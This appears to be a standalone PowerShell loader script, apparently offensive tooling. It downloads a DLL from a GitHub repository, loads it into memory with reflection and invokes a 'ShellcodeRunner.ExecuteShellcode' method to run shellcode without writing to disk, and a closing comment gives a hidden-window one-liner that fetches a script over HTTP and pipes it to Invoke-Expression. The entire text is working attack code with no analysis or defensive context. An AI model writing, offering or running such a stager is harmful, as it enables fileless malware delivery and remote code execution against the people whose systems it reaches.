$url = "https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/ClassLibrary3.dll"
$webClient = New-Object System.Net.WebClient
$assemblyBytes = $webClient.DownloadData($url)

# Load the assembly from the byte array
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# Define the type and method to invoke
$typeName = "ShellcodeRunner"  # Replace with actual namespace and class name if needed
$methodName = "ExecuteShellcode"  # Replace with actual method name

# Get the type from the assembly
$type = $assembly.GetType($typeName)


# Get the method to invoke
$methodInfo = $type.GetMethod($methodName, [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)

# Invoke the method
$methodInfo.Invoke($null, @())

#stager
#powershell -w h -c "iwr 'http://localhost:8080/loadsc_dynamic2.ps1' | iex"